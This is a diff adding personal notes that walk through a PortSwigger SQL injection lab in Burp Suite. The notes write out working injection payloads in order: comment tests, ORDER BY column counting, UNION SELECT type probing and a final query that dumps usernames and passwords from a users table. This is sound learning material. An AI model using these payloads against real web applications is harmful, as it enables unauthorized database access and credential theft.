@@ -1,0 +1,28 @@
+- start lab
+- open burp
+	- proxy tab
+		- intercept off
+		- http history tab
+		- proxy settings
+			- project 
+				- scope
+				- add the lab address to the scope
+
+- navigate to lab
+- click on a category
+- send category GET message to repeater
+- test if a sql injection vulnerability exists
+	- add '-- to the end of the GET request
+	- `GET /filter?category=Accessories'-- HTTP/2`
+- testing versions by using comments
+	- based on [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) and using `''YOUR'||'MOM'--` and ` '/*comment*/--` we can assume the database is Oracle or PostgreSQL  
+- Next step is to discover how many columns are in the table
+	- `'ORDER+BY+1--` yields a 200 OK - we can assume the table has at least one column
+	- `'ORDER+BY+2--`  yields a 200 OK - we can assume the table has at least two columns
+	- `'ORDER+BY+3--`  yields an internal error - we can assume the table has only two columns
+- Next step is to discover the type of data in each column
+	- `'UNION+SELECT+'a',NULL--` returns an internal error - can assume 1st column is not text
+	- `'UNION+SELECT+69,NULL--` returns 200 OK and our SQL to the screen - can assume the 1st column has numeric data 
+	- `'UNION+SELECT+69,'YOUR MOM'--` returns 200 OK and our SQL to the screen - can assume the 1st column has numeric data and the second column has text
+- Next step is to concatenate the data from the table back into table and to the screen
+	- `'Accessories1'UNION+SELECT+69,usernamne||' ~ '||password+FROM+users--` returns 200 OK and our SQL to the screen, and runs our query. invalidates accessories so that does not get printed to the screen. queries the user table for username and password and passes that data back into the table and to the screen  
